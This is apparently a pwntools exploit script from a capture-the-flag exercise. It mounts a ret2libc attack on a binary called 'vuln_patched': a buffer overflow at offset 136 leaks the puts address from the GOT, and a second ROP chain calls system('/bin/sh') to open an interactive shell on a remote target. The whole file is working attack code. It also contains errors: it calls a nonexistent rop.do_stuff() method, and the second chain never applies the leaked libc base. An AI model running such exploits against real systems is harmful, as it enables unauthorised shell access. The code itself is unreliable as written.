#!/usr/bin/env python3

from pwn import *

exe = ELF("./vuln_patched")
libc = ELF("./libc.so.6")
ld = ELF("./ld-2.27.so")

offset = 136

rop = ROP(exe)

put_plt = exe.plt['puts']
put_got = exe.got['puts']
#print(put_got)
rop.call('puts', [put_got])

gen = libc.search(b'/bin/sh')
binsh = gen.__next__()

context.binary = exe

systemadd = libc.symbols['system']
#rop.call(systemadd, [binsh])
rop.do_stuff()

print(rop.dump())

ropchain = fit({
	offset : rop
})
print(ropchain)
def conn():
    if args.LOCAL:
        r = process([exe.path])
        if args.DEBUG:
            gdb.attach(r)
    else:
        r = remote("addr", 1337)

    return r


def main():
    r = conn()
    r.sendline(ropchain)
    # good luck pwning :)
    r.recvline()
    puts_addr = int.from_bytes(r.recvline(keepends = False), byteorder = "little")
    libc_base = puts_addr - libc.symbols["puts"]
    #assert(libc_base & 0xFFF == 0)
    rop = ROP(exe)
    rop.call('puts', [exe.got['puts']]) # dummy call, align stack for XMM
    rop.call(libc.symbols["system"], [next(libc.search(b"/bin/sh"))])
#log.info("Second ROP Chain:\n{}".format(rop.dump()))

    payload = fit({
      offset: bytes(rop)
    })
    r.sendline(payload)
    r.recvline()
    r.recvline()
    r.interactive()


if __name__ == "__main__":
    main()
